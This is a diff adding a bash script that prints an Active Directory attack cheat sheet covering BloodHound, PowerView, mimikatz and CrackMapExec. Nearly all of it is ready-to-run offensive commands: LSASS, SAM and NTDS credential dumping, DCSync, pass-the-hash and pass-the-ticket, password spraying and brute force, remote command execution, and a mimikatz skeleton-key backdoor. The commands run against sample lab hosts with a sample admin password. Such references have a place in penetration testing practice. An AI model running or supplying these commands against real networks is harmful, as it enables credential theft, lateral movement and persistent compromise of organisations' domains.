@@ -1,0 +1,306 @@
+#!/bin/bash
+echo """
+=====================================================
+	BloodHound
+=====================================================
+neo4j console
+bloodhound
+login creds: neo4j:kali
+
+bloodhound-python -u administer -p Ignite@987 -ns 192.168.1.172 -d ignite.local -c All
+
+#Using exe 
+.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>
+
+#Using PowerShell 
+powershell -ep bypass
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
+or
+powershell -ep bypass
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectMethod All
+
+=====================================================
+	PowerView
+=====================================================
+Get Current Domain: Get-Domain
+Enumerate Other Domains: Get-Domain -Domain <DomainName>
+Get Domain SID: Get-DomainSID
+Get Domain Policy: Get-DomainPolicy
+
+#Will show us the policy configurations of the Domain about system access or kerberos
+Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
+Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
+_______________________________
+# Get Domain Controllers:
+Get-DomainController
+Get-DomainController -Domain <DomainName>
+_______________________________
+Enumerate Domain Users:
+#Save all Domain Users to a file
+Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
+
+#Will return specific properties of a specific user
+Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
+
+#Enumerate user logged on a machine
+Get-NetLoggedon -ComputerName <ComputerName>
+
+#Enumerate Session Information for a machine
+Get-NetSession -ComputerName <ComputerName>
+
+#Enumerate domain machines of the current/specified domain where specific users are logged into
+Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
+________________________________
+Enum Domain Computers:
+Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+
+#Enumerate Live machines
+Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+________________________________
+Enum Groups and Group Members:
+#Save all Domain Groups to a file:
+Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
+
+#Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
+Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
+Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName
+
+#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
+Get-NetLocalGroup | Select-Object GroupName
+
+#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
+Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
+
+#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
+Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+_________________________________
+Enumerate Shares:
+#Enumerate Domain Shares
+Find-DomainShare
+
+#Enumerate Domain Shares the current user has access
+Find-DomainShare -CheckShareAccess
+
+#Enumerate \"Interesting\" Files on accessible shares
+Find-InterestingDomainShareFile -Include *passwords*
+_________________________________
+Enum Group Policies:
+Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
+
+#Enumerate all GPOs to a specific computer
+Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName
+
+#Get users that are part of a Machine's local Admin group
+Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
+_________________________________
+Enum OUs:
+Get-DomainOU -Properties Name | Sort-Object -Property Name
+_________________________________
+Enum ACLs:
+# Returns the ACLs associated with the specified account
+Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs
+
+#Search for interesting ACEs
+Find-InterestingDomainAcl -ResolveGUIDs
+
+#Check the ACLs associated with a specified path (e.g smb share)
+Get-PathAcl -Path \"\\\\Path\Of\A\Share\"
+__________________________________
+Enum Domain Trust:
+Get-DomainTrust
+Get-DomainTrust -Domain <DomainName>
+
+#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
+Get-DomainTrustMapping
+__________________________________
+Enum Forest Trust:
+Get-ForestDomain
+Get-ForestDomain -Forest <ForestName>
+
+#Map the Trust of the Forest
+Get-ForestTrust
+Get-ForestTrust -Forest <ForestName>
+__________________________________
+User Hunting:
+#Finds all machines on the current domain where the current user has local admin access
+Find-LocalAdminAccess -Verbose
+
+#Find local admins on all machines of the domain
+Find-DomainLocalGroupMember -Verbose
+
+#Find computers were a Domain Admin OR a spesified user has a session
+Find-DomainUserLocation | Select-Object UserName, SessionFromName
+
+#Confirming admin access
+Test-AdminAccess
+_____________________________
+Using AD Module
+Get Current Domain: Get-ADDomain
+Enum Other Domains: Get-ADDomain -Identity <Domain>
+Get Domain SID: Get-DomainSID
+Get Domain Controlers:
+    Get-ADDomainController
+    Get-ADDomainController -Identity <DomainName>
+
+Enumerate Domain Users:
+    Get-ADUser -Filter * -Identity <user> -Properties *
+
+    #Get a spesific \"string\" on a user's attribute
+    Get-ADUser -Filter 'Description -like \"*wtver*\"' -Properties Description | select Name, Description
+
+Enum Domain Computers:
+
+    Get-ADComputer -Filter * -Properties *
+    Get-ADGroup -Filter *
+
+Enum Domain Trust:
+
+    Get-ADTrust -Filter *
+    Get-ADTrust -Identity <DomainName>
+
+Enum Forest Trust:
+
+    Get-ADForest
+    Get-ADForest -Identity <ForestName>
+
+    #Domains of Forest Enumeration
+    (Get-ADForest).Domains
+    
+=========================================================
+	mimikatz
+=========================================================
+
+#Dump LSASS:
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz sekurlsa::logonpasswords
+
+#(Over) Pass The Hash
+mimikatz privilege::debug
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
+
+#List all available kerberos tickets in memory
+mimikatz sekurlsa::tickets
+
+#Dump local Terminal Services credentials
+mimikatz sekurlsa::tspkg
+
+#Dump and save LSASS in a file
+mimikatz sekurlsa::minidump c:\temp\lsass.dmp
+
+#List cached MasterKeys
+mimikatz sekurlsa::dpapi
+
+#List local Kerberos AES Keys
+mimikatz sekurlsa::ekeys
+
+#Dump SAM Database
+mimikatz lsadump::sam
+
+#Dump SECRETS Database
+mimikatz lsadump::secrets
+
+#Inject and dump the Domain Controler's Credentials
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz lsadump::lsa /inject
+
+#Dump the Domain's Credentials without touching DC's LSASS and also remotely
+mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+
+#List and Dump local kerberos credentials
+mimikatz kerberos::list /dump
+
+#Pass The Ticket
+mimikatz kerberos::ptt <PathToKirbiFile>
+
+#List TS/RDP sessions
+mimikatz ts::sessions
+
+#List Vault credentials
+mimikatz vault::list 
+
+====================================================
+Crackmapexec Hackingarticles
+====================================================
+apt install crackmapexec
+
+# Enumeration: Discovering IPs
+crackmapexec smb 192.168.1.0/24
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987'
+
+# Enumeration: Users
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --users
+
+# Enumeration: Groups
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --groups
+
+# Enumeration: Text files
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --spider C\$ --pattern txt
+
+# Enumeration: Log Files
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --spider C\$ --pattern log
+
+# Enumeration: Shares
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --shares
+
+# Enumeration: Sessions
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sessions
+
+# Enumeration: Password Policies
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --pass-pol
+
+# Enumeration: Drives
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --disks
+
+# Bruteforce: Username
+crackmapexec smb 192.168.1.0/24 -u \"kavish\" \"Administrator\" -p \"Ignite@987\"
+
+# Bruteforce: Password
+crackmapexec smb 192.168.1.0/24 -u \"Administrator\" -p \"password1\" \"password2\" \"Ignite@987\"
+
+# Dictionary Attack
+crackmapexec smb 192.168.1.0/24 -u /root/Desktop/user.txt -p /root/Desktop/pass.txt
+
+# Credential Dumping: SAM
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sam
+
+# Credential Dumping: LSA
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --lsa
+
+# Credential Dumping: NTDS (DRSUAPI)
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds drsuapi
+
+# Credential Dumping: NTDS (VSS)
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds vss
+
+# Pass the Hash
+crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38
+
+# Password Spraying
+crackmapexec smb 192.168.1.106 -u /root/Desktop/user.txt -p 'Password@1' --rid-brute
+crackmapexec smb 192.168.1.106 -u /root/Desktop/user.txt -p 'Password@1' --continue-on-success
+
+# Remote Command Execution
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -X 'quser'
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'logoff 2'
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'net user Administrator /domain' --exec-method atexec
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'net user Administrator /domain' --exec-method wmiexec
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -X '\$PSVersionTable' --exec-method wmiexec
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --wmi \"select Name from Win32_UserAccount\"
+
+# Modules: mimikatz
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='privilege::debug'
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='sekurlsa::logonPasswords'
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='misc::skeleton'
+
+# Module: Wdigest
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M wdigest -o ACTION=enable
+
+# Module: enum_dns
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M enum_dns
+
+"""
